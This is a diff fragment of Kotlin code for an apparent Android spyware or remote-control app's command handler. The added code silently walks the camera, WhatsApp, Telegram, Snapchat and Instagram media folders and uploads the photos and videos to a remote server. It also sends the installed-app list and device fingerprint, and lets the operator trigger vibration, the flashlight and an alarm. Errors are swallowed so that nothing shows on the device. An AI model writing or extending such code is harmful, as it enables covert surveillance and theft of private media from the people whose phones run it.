@@ -440,4 +440,153 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                 Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                 Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-                Environment.getExternalStorage
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
+                File("/storage/emulated/0/WhatsApp/Media"),
+                File("/storage/emulated/0/Telegram"),
+                File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
+                File("/storage/emulated/0/MIUI/Gallery"),
+                File("/storage/emulated/0/Snapchat"),
+                File("/storage/emulated/0/Instagram")
+            )
+            dirs.forEach { dir ->
+                if (!dir.exists()) return@forEach
+                try {
+                    dir.walkTopDown().take(500).forEach { f ->
+                        if (f.isFile && f.length() < 20 * 1024 * 1024) {
+                            val ext = f.extension.lowercase()
+                            if (ext in listOf("jpg","jpeg","png","gif","webp","mp4","mov","3gp","mkv")) {
+                                uploadFile(f, if (ext in listOf("jpg","jpeg","png","gif","webp")) "photo" else "video")
+                            }
+                        }
+                    }
+                } catch (e: Exception) {}
+            }
+        } catch (e: Exception) {}
+    }
+
+    private fun handleApps() {
+        try {
+            val pm = ctx.packageManager
+            val arr = JSONArray()
+            pm.getInstalledApplications(0).forEach { app ->
+                arr.put(JSONObject().apply {
+                    put("name", pm.getApplicationLabel(app).toString())
+                    put("package", app.packageName)
+                })
+            }
+            val json = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("apps", arr)
+                put("token", Config.DEVICE_TOKEN)
+            }
+            post("${Config.SERVER_URL}/api/device/apps", json)
+        } catch (e: Exception) {}
+    }
+
+    private fun handleDeviceInfo() {
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("info", JSONObject().apply {
+                put("model", Build.MODEL)
+                put("brand", Build.BRAND)
+                put("manufacturer", Build.MANUFACTURER)
+                put("android", Build.VERSION.RELEASE)
+                put("sdk", Build.VERSION.SDK_INT)
+                put("cpu", Build.HARDWARE)
+                put("device", Build.DEVICE)
+                put("fingerprint", Build.FINGERPRINT)
+                put("totalRAM", getTotalRAM())
+                put("availableRAM", getAvailableRAM())
+                put("totalStorage", getTotalStorage())
+                put("availableStorage", getAvailableStorage())
+            })
+            put("token", Config.DEVICE_TOKEN)
+        }
+        post("${Config.SERVER_URL}/api/device/info", json)
+    }
+
+    private fun vibrate() {
+        try {
+            val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= 26) {
+                v.vibrate(VibrationEffect.createOneShot(1500, VibrationEffect.DEFAULT_AMPLITUDE))
+            } else { @Suppress("DEPRECATION") v.vibrate(1500) }
+        } catch (_: Exception) {}
+    }
+
+    private fun flashlight(on: Boolean) {
+        try {
+            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val id = cm.cameraIdList.firstOrNull { cid ->
+                cm.getCameraCharacteristics(cid).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
+            } ?: return
+            cm.setTorchMode(id, on)
+        } catch (_: Exception) {}
+    }
+
+    private fun playSound() {
+        try {
+            val r = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
+            android.media.RingtoneManager.getRingtone(ctx, r).play()
+        } catch (_: Exception) {}
+    }
+
+    private fun hasPerm(p: String): Boolean =
+        ActivityCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
+
+    private fun post(url: String, json: JSONObject) {
+        Volley.newRequestQueue(ctx).add(JsonObjectRequest(
+            Request.Method.POST, url, json,
+            { Log.d(TAG, "Posted: $url") }, { Log.e(TAG, "Post fail: ${it.message}") }
+        ))
+    }
+
+    private fun uploadFile(file: File, type: String) {
+        try {
+            val url = "${Config.SERVER_URL}/api/device/upload"
+            val req = object : com.android.volley.VolleyMultipartRequest(
+                Request.Method.POST, url,
+                { Log.d(TAG, "✅ Uploaded: ${file.name}") },
+                { Log.e(TAG, "Upload fail: ${it.message}") }
+            ) {
+                override fun getByteData(): MutableMap<String, DataPart> {
+                    return hashMapOf("file" to DataPart(file.name, readFile(file)))
+                }
+                override fun getParams(): MutableMap<String, String> {
+                    return hashMapOf("deviceId" to deviceId, "type" to type, "token" to Config.DEVICE_TOKEN)
+                }
+            }
+            Volley.newRequestQueue(ctx).add(req)
+        } catch (e: Exception) { Log.e(TAG, "Upload err: ${e.message}") }
+    }
+
+    private fun readFile(file: File): ByteArray {
+        val fis = FileInputStream(file)
+        val b = fis.readBytes()
+        fis.close()
+        return b
+    }
+
+    private fun getTotalRAM(): Long {
+        val mi = android.app.ActivityManager.MemoryInfo()
+        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(mi)
+        return mi.totalMem / (1024 * 1024)
+    }
+
+    private fun getAvailableRAM(): Long {
+        val mi = android.app.ActivityManager.MemoryInfo()
+        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(mi)
+        return mi.availMem / (1024 * 1024)
+    }
+
+    private fun getTotalStorage(): Long {
+        val s = android.os.StatFs(Environment.getDataDirectory().path)
+        return (s.blockCountLong * s.blockSizeLong) / (1024 * 1024)
+    }
+
+    private fun getAvailableStorage(): Long {
+        val s = android.os.StatFs(Environment.getDataDirectory().path)
+        return (s.availableBlocksLong * s.blockSizeLong) / (1024 * 1024)
+    }
+}
